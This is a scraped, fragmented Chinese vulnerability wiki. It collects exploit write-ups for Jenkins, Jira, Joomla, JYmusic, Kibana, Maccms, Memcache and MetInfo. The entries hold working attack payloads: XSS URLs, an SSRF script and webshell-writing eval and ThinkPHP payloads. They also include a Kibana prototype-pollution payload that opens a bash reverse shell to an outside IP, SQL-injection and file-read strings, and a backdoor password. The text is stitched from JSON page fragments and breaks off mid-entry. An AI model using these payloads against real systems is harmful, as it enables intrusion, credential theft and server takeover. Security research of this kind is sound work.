http://192.168.1.75:8080/plugin/build-metrics/getBuildStats?label=alert(\"CVE-2019-10475\")&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search 2、利用脚本 #!/usr/bin/env python import sys import argparse VULN_URL = '''{base_url}/plugin/build-metrics/getBuildStats?label={inject}&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search''' def get_parser(): parser = argparse.ArgumentParser(description='CVE-2019-10475') parser.add_argument('-p', '--port', help='port', default=80, type=int) parser.add_argument('-d', '--domain', help='domain', default='localhost', type=str) parser.add_argument('-i', '--inject', help='inject', default='alert(\"CVE-2019-10475\")', type=str) return parser def main(): parser = get_parser() args = vars(parser.parse_args()) port = args['port'] domain = args['domain'] inject = args['inject'] if port == 80: base_url = f'http://{domain}' elif port == 443: base_url = f'https://{domain}' else: base_url = f'http://{domain}:{port}' build_url = VULN_URL.format(base_url=base_url, inject=inject) print(build_url) return 0 if __name__ == '__main__': sys.exit(main()) Usage: $ python3 CVE-2019-10475.py --help usage: CVE-2019-10475.py [-h] [-p PORT] [-d DOMAIN] [-i INJECT] CVE-2019-10475 optional arguments: -h, --help show this help message and exit -p PORT, --port PORT port -d DOMAIN, --domain DOMAIN domain -i INJECT, --inject INJECT inject 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-08 00:46:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jira/2.html":{"url":"0day/Jira/2.html","title":"Jenkins功能未授权访问导致的远程命令执行漏洞","keywords":"","body":"Jenkins功能未授权访问导致的远程命令执行漏洞 一、漏洞简介 Jenkins管理登陆之后，后台”系统管理”功能，有个”脚本命令行的”功能，它的作用是执行用于管理或故障探测或诊断的任意脚本命令，利用该功能，可以执行系统命令，该功能实际上Jenkins正常的功能，由于很多管理账号使用了弱口令，或者管理后台存在未授权访问，导致该功能会对Jenkins系统服务器产生比较严重的影响和危害。 二、漏洞影响 三、复现过程 找到“系统管理”——“脚本命令行”。 输入任意的Groovy脚本并在服务器上执行它。对于故障排除和诊断很有用。使用’println’命令查看输出（如果使用System.out，它将输出到服务器的标准输出，很难看到。）示例： println(Jenkins.instance.pluginManager.plugins) 在脚本命令行中输入下面的语句，即可执行相应的命令： println \"whoami\".execute().text println \"ifconfig\".execute().text 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-03 13:57:41 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jira/1.html":{"url":"0day/Jira/1.html","title":"（CVE-2019-8451）Jira未授权SSRF漏洞验证","keywords":"","body":"（CVE-2019-8451）Jira未授权SSRF漏洞验证 一、漏洞简介 （CVE-2019-8451）Jira未授权SSRF漏洞验证 二、影响范围 三、复现过程 https://github.com/ianxtianxt/CVE-2019-8451 #coding:utf-8 import requests host = 'http://xx.xx.xx.xx:8080' header = { 'X-Atlassian-Token': 'no-check', 'Connection': 'close' } url = host + '/plugins/servlet/gadgets/makeRequest?url='+host+'@www.baidu.com/' html = requests.get(url = url,headers = header) print html.text 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Joomal/1.html":{"url":"0day/Joomal/1.html","title":"Joomla 3.4.6 - 'configuration.php' Remote Code Execution","keywords":"","body":"Joomla 3.4.6 - 'configuration.php' 远程代码执行 一、漏洞简介 Joomla 3.4.6 - 'configuration.php' Remote Code Execution 二、影响范围 Joomla 3.0.0 至 3.4.6 三、复现过程 https://github.com/ianxtianxt/Joomla-3.4.6---configuration.php-Remote-Code-Execution 脚本验证 验证： python3 test.py -t http://127.0.0.1:8080/ 显示“Vulnerable”证明存在漏洞 利用： python3 test.py -t http://127.0.0.1:8080/ --exploit --lhost 192.168.31.126 --lport 2121 执行成功 并在“configuration.php”写入随机密码的一句话木马 上图的密码为：kyevgbxjmwivdvegohfzwuukuzswxqquthlrsollpxzgiifumi 蚁剑链接测试 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 01:28:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Joomal/2.html":{"url":"0day/Joomal/2.html","title":"joomscan","keywords":"","body":"joomscan 一、漏洞简介 joomscan 二、影响范围 三、复现过程 https://github.com/rezasp/joomscan 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-10-29 13:15:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/JYmusic/3.html":{"url":"0day/JYmusic/3.html","title":"JYmusic 1.x 版本 前台getshell","keywords":"","body":"JYmusic 1.x 版本 前台getshell 一、漏洞简介 二、漏洞影响 1.x版本 三、复现过程 访问前台，注册一个用 注册成功后点击右上角设置，个人资料，头像设置 抓包，修改文件后缀为.php 上传成功后访问个人中心，这里头像已经换了，审查元素查看头像的文件路径 访问http://0-sec.org/Uploads/Avatars/uid_2/128.php 成功解析，通过这种办法上传一个phpinfo 访问文件 四、参考链接 > 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 19:39:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/JYmusic/2.html":{"url":"0day/JYmusic/2.html","title":"Ymusic 2.0 前台XSS漏洞","keywords":"","body":"JYmusic 2.0 前台XSS漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 利用条件 1.登录会员 2.认证音乐人 上传音乐时，抓包，修改name或者cover_url参数 值为： XSS\">alert(document.cookie)> 此时提交的音乐就会存储到数据库中，由于name和cover_url没有过滤，导致在后台管理员审核的时候会触发一个XSS 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 19:35:36 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/JYmusic/1.html":{"url":"0day/JYmusic/1.html","title":"JYmusic 2.0 命令执行漏洞","keywords":"","body":"（CNVD-2019-06251）JYmusic 2.0 命令执行漏洞 一、漏洞简介 CNVD-2019-06251 二、漏洞影响 三、复现过程 漏洞分析 危险函数 /core/library/think/Request.php类中的filterValue函数中，使用了call_user_func函数。 通过构造使得$filter=system， $value=dir ，通过call_user_func函数即可执行系统命令” dir ”。 array_walk_recursive函数 /core/library/think/Request.php类中的input函数里调用了通过array_walk_recursive函数调用了filterValue函数。array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数。 input函数 /core/library/think/Request.php中的param函数调用了input函数。 exec 函数 /core/library/think/App.php类中的exec 函数通过Request::instance()->param()调用了param函数。 run函数 /core/library/think/App.php类中的run函数则调用了exec函数 传入的dispatch和dispatch和dispatch和config两个参数分别来自于/core/library/think/App.php类中run函数里的： 变量覆盖 /core/library/think/App.php类中run函数里，获取dispatch变量值时调用了routeCheck函数。routeCheck函数中则通过Route::chekc调用了check函数。/core/library/think/Route.php类中，check函数通过dispatch变量值时调用了routeCheck函数。routeCheck函数中则通过Route::chekc调用了check函数。/core/library/think/Route.php类中，check函数通过dispatch变量值时调用了routeCheck函数。routeCheck函数中则通过Route::chekc调用了check函数。/core/library/think/Route.php类中，check函数通过request->method()调用了method函数。 /core/library/think/Request.php类中，通过post参数_method=__construct调用构造函数： 在构造函数里用filter=system覆盖类中的filter变量。 post参数 method=GET 就是要再次调用method函数，并且使得if(true===$method)为真，从而获取 _SERVER[REQUEST_METHOD]=dir 这个参数值。 调用入口 /core/library/think/App.php类中的run函数，则是在index.php入口函数中调用。 漏洞复现 拦截首页请求，Change request method修改请求方式为POST 参数： POST的参数的作用已在漏洞分析环节分析。 filter=system&_SERVER[REQUEST_METHOD]=dir&_method=__construct&method=GET POST参数后不能有\\r\\n回车换行，如果有就不能成功执行。 POST /captcha HTTP/1.1 //请求一个验证码，引导程序的运行步骤。 写入shell filter=system&_SERVER[REQUEST_METHOD]=echo “” >test.php&_method=__construct&method=GET phpinfo() http://0-sec.org/test.php?test=phpinfo(); //末尾一定要跟一个“分号” “ ; ” ，如果没有则不能成功执行。 四、参考链接 https://blog.csdn.net/yun2diao/article/details/91345116 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 19:42:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/kibana/1.html":{"url":"0day/kibana/1.html","title":"（CVE-2019-7609）kibana原型链污染导致的RCE","keywords":"","body":"标题 一、漏洞简介 Kibana 是一款开源的数据分析和可视化平台，它是Elastic Stack成员之一，设计用于和Elasticsearch协作。 二、漏洞影响 三、复现过程 环境搭建 docker pull docker.elastic.co/kibana/kibana:6.5.4 docker network create elastic docker run --network=elastic --name=elasticsearch docker.elastic.co/elasticsearch/elasticsearch:6.5.4 docker run -d --name kibana --net elastic -p 5601:5601 docker.elastic.co/kibana/kibana:6.5.4 docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' kibana 这样启动的kibana没法调试，可以自己改改镜像，在node启动命令里加个inspect参数： docker ps -a --no-trunc # 找到启动脚本 在node启动命令后加上--inspect=0.0.0.0:9229 docker commit kibana kibana-debug # 保存修改后的镜像 docker rm -f kibana docker run --name kibana --net elastic -p 5601:5601 -p 9229:9229 kibana-debug # 启动修改后的kibana容器 kibana控制台：http://127.0.0.1:5601/ inspect调试器：chrome://inspect/ 漏洞分析 原型链污染点：props()函数可以给对象设置属性 有了污染点，就可以思考怎么利用了。 最简单的利用，设置一个cookie就可以导致拒绝服务： .es(*).props(label.__proto__.cookie=\"aaa\") 要复原的话可以在inspect调试器里删掉原型对象的cookie属性： DOS很好实现，怎么搞成RCE呢？根据经验，容易想到一些常见情形，如： if(obj.jsCode) eval(obj.jsCode) 这种白给的 express ejs模版引擎中的动态函数调用 作者并没有找到明显的代码执行点，但是在瞎点到canvas的时候，他发现控制台暴了很多错误（这是inpector的输出，也就是说如果启docker的时候加了-d的话，可能就错过这个RCE了...）。 作者据此得出结论：kibana在创建新进程 创建进程可就是个敏感的行为了，能不能污染命令/参数呢？ 来动态看下进程创建的过程， 首先调用normalizeSpawnArguments.apply()处理参数， 跟进， 这里实际是在处理child_process.spawn(command[, args][, options])的第三个参数options。 这里面的有些参数是undefined的，只有声明了才会处理，也即是我们可以污染的。 作者利用的就是这个env参数，它以键值对的形式向子进程传递环境变量（我尝试了一些其它参数，没发现可利用的）。 能控制进程的环境变量了，有什么用呢？我们不知道子进程会对环境变量做些什么操作啊，这是容易被忽视的一个重点。 回想下控制台报的错：\"Starting inspector on 0.0.0.0:9229 failed: address already in use\"。 这句话透露出的是：此时正在创建一个node命令进程，并且使用了--inpect:0.0.0.0:9229参数。 这下目标就清晰了，我们能控制的node的环境变量。 在node中，有一个NODE_OPTIONS变量， 通过这个变量，可以覆盖node进程的参数。 也就是说，现在我们能控制node进程的参数了。这就很有用了，比如--eval参数是可以直接执行代码的。 但是，NODE_OPTIONS似乎考虑到了这种潜在的安全问题，它只能使用部分参数，向--eval这种是用不了的。 不过作者找到了另一个参数--require， 这个有点像php里的auto_prepend_file，预加载一个文件。 现在我们可以看成有一个文件包含的洞了，怎么RCE呢？ 通常，我们都会上传一个文件再包含，或者去包含web服务器日志/SSH日志。 作者这里利用的方法也十分巧妙，Linux下一切皆文件，我们已经能控制子进程的环境变量，也就是能控制/proc/self/environ这个文件，直接包含这个文件不就好了。 最后payload如下： .es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -c \\'bash -i>& /dev/tcp/10.70.53.113/6666 0>&1\\'\");//') .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ') 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-13 14:49:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Maccms/1.html":{"url":"0day/Maccms/1.html","title":"Maccms8.x(苹果cms)命令执行漏洞","keywords":"","body":"Maccms8.x(苹果cms)命令执行漏洞 一、漏洞简介 搜索页面搜索参数过滤不严 导致直接eval执行PHP语句，前台命令执行可getshell 二、漏洞影响 Maccms8.x 三、复现过程 payload： http://0-sec.org/index.php?m=vod-search&wd={if-A:phpinfo()}{endif-A} getshell payload（a）: http://0-sec.org/index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A} POST a=phpinfo() 写入网站根目录一句话木马文件payload（文件名：test.php，密码：test）: http://0-sec.org/index.php?m=vod-search&wd={if-A:print(fputs%28fopen%28base64_decode%28dGVzdC5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW3Rlc3RdKTsgPz4%29%29)}{endif-A} 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 15:35:13 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Maccms/3.html":{"url":"0day/Maccms/3.html","title":"Maccms后门","keywords":"","body":"Maccms后门 一、漏洞简介 有人假冒苹果cms官网，发布带有后门的程序。 二、漏洞影响 version v10 三、复现过程 后门文件路径 maccms10\\extend\\upyun\\src\\Upyun\\Api\\Format.php maccms10\\extend\\Qcloud\\Sms\\Sms.php 密码 WorldFilledWithLove 后门样本 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-15 21:04:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Maccms/2.html":{"url":"0day/Maccms/2.html","title":"（CVE-2019-9829）Maccms背景任意文件写入getshell","keywords":"","body":"（CVE-2019-9829）Maccms背景任意文件写入getshell 一、漏洞简介 二、漏洞影响 v10 三、复现过程 登录到后台，单击基本->类别管理；您可以看到用于每个类别的类别页面模板。您会看到这里使用的模板是/art/type.html 在后台，您可以编辑模板：单击模板-“模板管理”，转到./template/default_pc/html/art的模板管理区域，单击“编辑”， 输入php代码。 访问 index.php/art/type/id/5.html PHP代码成功执行。 原理分析 该程序最初旨在禁止将模板更改为PHP文件： 但是，在渲染模板时，该程序会将模板文件写入缓存文件，然后将其包含在“ include”中，因此，禁止将模板更改为php文件后，仍然可以执行代码。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 15:48:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Memcache/1.html":{"url":"0day/Memcache/1.html","title":"Memcache未授权访问","keywords":"","body":"Memcache未授权访问 一、漏洞简介 memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。 二、影响范围 三、复现过程 1.扫描探测 nmap -sV -p 11211 --script memcached-info 0.0.0.0 ##! /usr/bin/env python ## _*_ coding:utf-8 _*_ def Memcache_check(ip, port=11211, timeout=5): try: socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(\"stats\\r\\n\") result = s.recv(1024) if \"STAT version\" in result: print '[+] Memcache Unauthorized: ' +ip+':'+str(port) except Exception, e: pass if __name__ == '__main__': Elasticsearch_check(\"127.0.0.1\") 2.攻击利用 2.1 基础部分 通过一个cheat sheet了解一下Memcached的协议。Memcached的语法由如下元素组成 {COMMAND}0x20{ARGUMENT}(LF|CRLF) command字段有如下几条命令 存储操作(set, add, replace, append, prepend, cas) 检索操作 (get, gets) 删除操作 (delete) 增减操作 (incr, decr) touch slabs reassign slabs automove lru_crawler 统计操作(stats items, slabs, cachedump) 其他操作 (version, flush_all, quit) Command 描述 实例 get 读某个值 get mykey set 强制设置某个键值 set mykey 0 60 5 add 添加新键值对 add newkey 0 60 5 replace 覆盖已经存在的key replace key 0 60 5 flush_all 让所有条目失效 flush_all stats 打印当前状态 stats stats malloc 打印内存状态 stats malloc version | 打印Memcached版本 | version stats //查看memcache 服务状态 stats items //查看所有items stats cachedump 32 0 //获得缓存key get :state:264861539228401373:261588 //通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露 2.2 建立连接并获取信息 telnet 11211，或 nc -vv 11211，无需用户名密码，可以直接连接memcache 服务的11211端口。 附赠大佬写的文章 Discuz!因Memcached未授权访问导致的RCE 3.防范措施 1.限制访问 如果memcache没有对外访问的必要，可在memcached启动的时候指定绑定的ip地址为 127.0.0.1。其中 -l 参数指定为本机地址。例如： memcached -d -m 1024 -u root -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid 或者 vim /etc/sysconfig/memcached，修改配置文件 OPTIONS=\"-l 127.0.0.1\"，只能本机访问，不对公网开放，保存退出 /etc/init.d/memcached reload 2.防火墙 // accept ## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 11211 -j ACCEPT ## iptables -A INPUT -p udp -s 127.0.0.1 --dport 11211 -j ACCEPT // drop ## iptables -I INPUT -p tcp --dport 11211 -j DROP ## iptables -I INPUT -p udp --dport 11211 -j DROP // 保存规则并重启 iptables ## service iptables save ## service iptables restart 3.使用最小化权限账号运行Memcached服务 使用普通权限账号运行，指定Memcached用户。 memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid 4.启用认证功能 Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。SASL认证详细配置手册 5.修改默认端口 修改默认11211监听端口为11222端口。在Linux环境中运行以下命令： memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid 6.定期升级 参考: http://lzone.de/cheat-sheet/memcached https://www.secpulse.com/archives/49659.html https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/ https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf http://niiconsulting.com/checkmate/2013/05/memcache-exploit/ https://xz.aliyun.com/t/2018 http://drops.xmd5.com/static/drops/web-8987.html https://blog.csdn.net/microzone/article/details/79262549 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/MetInfo/1.html":{"url":"0day/MetInfo/1.html","title":"Metinfo 6.1.2 SQL注入","keywords":"","body":"Metinfo 6.1.2 SQL注入 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 漏洞文件：/var/www/html/metinfo6.1.2/app/system/message/web/message.class.php 漏洞函数：add 37-51行 public function add($info) { global $_M; if(!$_M[form][id]){ $message=DB::get_one(\"select * from {$_M[table][column]} where module= 7 and lang ='{$_M[form][lang]}'\"); $_M[form][id]=$message[id]; } $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = {$_M[form][id]}\"); $_M[config][met_fd_ok]= $met_fd_ok[value]; if(!$_M[config][met_fd_ok])okinfo('javascript:history.back();',\"{$_M[word][Feedback5]}\"); if($_M[config][met_memberlogin_code]){ if(!load::sys_class('pin', 'new')->check_pin($_M['form']['code'])){ okinfo(-1, $_M['word']['membercode']); } } 漏洞触发点： $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = {$_M[form][id]}\"); 由于无单引号过滤导致sql注入，这个时候尝试注入发现关键词全被替换了，无法注入。于是查看__controler函数发现调用了父类的初始化函数。 class feedback extends web 跟进web类，没有对用户传入的数据进行过滤等操作，却初始化了common类 class web extends common 查看Common类的初始化函数发现了问题所在 public function __construct() { global $_M;//全局数组$_M ob_start();//开启缓存 $this->load_mysql();//数据库连接 $this->load_form();//表单过滤 $this->load_lang();//加载语言配置 $this->load_config_global();//加载全站配置数据 $this->load_url_site(); $this->load_config_lang();//加载当前语言配置数据 $this->load_url();//加载url数据 } 跟踪 $this→load_form() 函数 protected function load_form() { global $_M; $_M['form'] =array(); isset($_REQUEST['GLOBALS']) && exit('Access Error'); foreach($_COOKIE as $_key => $_value) { $_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value); } foreach($_POST as $_key => $_value) { $_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value); } foreach($_GET as $_key => $_value) { $_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value); } if(is_numeric($_M['form']['lang'])){//伪静态兼容 $_M['form']['page'] = $_M['form']['lang']; $_M['form']['lang'] = ''; } if($_M['form']['metid'] == 'list'){ $_M['form']['list'] = 1; $_M['form']['metid'] = $_M['form']['page']; $_M['form']['page'] = 1; } if(!preg_match('/^[0-9A-Za-z]+$/', $_M['form']['lang']) && $_M['form']['lang']){ echo \"No data in the database,please reinstall.\"; die(); } } 把COOKIE、POST、GET 传入 daddslashes函数进行过滤 function daddslashes($string, $force = 0) { !defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc()); if(!MAGIC_QUOTES_GPC || $force) { if(is_array($string)) { foreach($string as $key => $val) { $string[$key] = daddslashes($val, $force); } } else { if(!defined('IN_ADMIN')){ $string = trim(addslashes(sqlinsert($string))); }else{ $string = trim(addslashes($string)); } } } return $string; } 这里判断是否开启了get_magic_quotes_gpc() 如果没开启或者 $force !=0 就进入过滤。 然而最重要的环节在这里 if(!defined('IN_ADMIN')){ $string = trim(addslashes(sqlinsert($string))); }else{ $string = trim(addslashes($string)); } 判断 IN_ADMIN 常量是否已经定义了，如果没定义就使用$string = trim(addslashes(sqlinsert($string)));来过滤我们的值 而如果定义了就使用$string = trim(addslashes($string));来过滤。 刚刚我们进行sql注入测试失败而且语句被过滤了， addslashes只过滤特殊字符，所以我们肯定是被 sqlinsert函数给过滤了。导致我们无法sql注入。至于sqlinsert函数我就不贴出来了，我们要做的是饶过这个函数，而不是饶过他这个规则。 defined('IN_ADMIN') 我们需要找这个常量在哪里定义的。其实写这句话有点多余，看过我之前几篇Metinfo漏洞的话应该就会发现问题了。我写过一个关于/admin/index.php文件任意调用带do方法的问题。 然后我们打开这个文件看一下。 没错这个常量就是在这个文件定义的。而且他可以调用任意带do方法。不过问题又来了，漏洞函数是add并且不带do，那就找调用白，于是找到 domessage这个函数。 domessage方法 18-24 public function domessage() { global $_M; if($_M['form']['action'] == 'add'){ $this->check_field(); $this→add($_M['form']); 这里在调用 add方法之前先调用了 check_field方法，我们要做的就是保证程序能够顺利执行到add方法，研究了一会发现只需要正常留言，把它传递的参数拷下来就ok了。 然后顺利执行到了add方法，成功的进行了sql注入。 payload： http:/0-sec.org/metinfo6//admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn¶137=1¶186=1¶138=1¶139=1¶140=1&id=42 这里说一下这个id=42，这个值42是不能修改的，目的是让他返回验证码错误，饶过了第一层判断。 if(!$_M[config][met_fd_ok])okinfo('javascript:history.back();',\"{$_M[word][Feedback5]}\"); if($_M[config][met_memberlogin_code]){ if(!load::sys_class('pin', 'new')->check_pin($_M['form']['code'])){ okinfo(-1, $_M['word']['membercode']); } } 至于为什么让他饶过第一层判断返回验证码错误，这样的话我们可以布尔盲注，否则只能进行时间注入。这里不多解释，自己研究一下。 解决方法 修改文件：metinfo6.1.2/app/system/message/web/message.class.php 修改内容： $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = {$_M[form][id]}\"); 修改为： $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = ‘{$_M[form][id]}’\"); 这样就解决了。 漏洞验证脚本 https://github.com/ianxtianxt/Metinfo-6.1.2-SQL-injection 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-21 21:08:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/MetInfo/2.html":{"url":"0day/MetInfo/2.html","title":"Metinfo任意文件读取","keywords":"","body":"MetInfo 任意文件读取 一、漏洞简介 MetInfo是一套使用PHP和Mysql开发的内容管理系统。 MetInfo 6.0.0~6.1.0版本中的 old_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件 二、漏洞影响 MetInfo 6.0.0 MetInfo 6.1.0 三、复现过程 漏洞分析 进攻分析 看下\\MetInfo6\\app\\system\\include\\module\\old_thumb.class.php 从代码中看用看到，$dir直接由$_GET['dir']传递进来，并将../置空。目标是进入到第一个，如果里面的readfile($dir);，读取文件。看看如果语句的条件，的英文外面一个strstr函数，判断$dir中http字符串的首次出现位置，实质上，要进入到这个if语句里面，$dir中必须包含http字符串。里面的将$dir中包含$_M['url']['site']的部分放置空，这里可以不用管。 从上面的分析可以构造出有效负载，只要$dir里包含http字符串就可以进入到readfile函数从而重新读取任意函数，然后可以使用..././来进行目录替换，因为../会被置空，所以最终payload如下 ?dir=..././http/..././config/config_db.php ?dir=.....///http/.....///config/config_db.php ?dir=http/.....///.....///config/config_db.php ?dir=http\\..\\..\\config\\config_db.php 漏洞复现 要先找到调用old_thumb.class.php的文件，看到include/thumb.php，可以从这个文件里面进入到old_thumb.class.php 所以我们通过thumb.php将构造好的$dir传入即可。 可以看到成功的读取到了config/config_db.php的内容。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-21 21:24:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/MetInfo/MetInfo系统中一处旧插件导致的ssrf.html":{"url":"0day/MetInfo/MetInfo系统中一处旧插件导致的ssrf.html","title":"MetInfo系统中一处旧插件导致的ssrf","keywords":"","body":"MetInfo系统中隐藏的一处旧插件导致的ssrf 一、漏洞简介 二、漏洞影响 三、复现过程 利用的话，ssrf嘛你可以扫描扫描端口咯。 我这里的话，简单说明利用一下 分析过程 文件：MetInfo_v6.1.0\\app\\app\\ueditor\\php\\Uploader.class.php get_headers这里是验证资源是否存在的，不存在就不走下面了，所以这里可以用来判断端口，例如81端口不存在那么他这里就会直接报错了 $this->stateInfo = $this->getStateInfo(\"ERROR_DEAD_LINK\"); 这个时候我还不清楚的$this->fileField 的值是向哪里获取的=-= 又搜索了一下。 需要注意的是：$type == \"remote\" 才能进入$this->saveRemote();流程引起漏洞触发。 搜索一下 打开文件：MetInfo_v6.1.0\\app\\app\\ueditor\\php\\action_crawler.php 打开文件以后，虽然引入了Uploader.class.php 但是没有引入$CONFIG所以直接调用代码会报错，那么就继续找引入 搜索一下 打开文件：MetInfo_v6.1.0\\app\\app\\ueditor\\php\\controller.php 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-20 22:45:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && 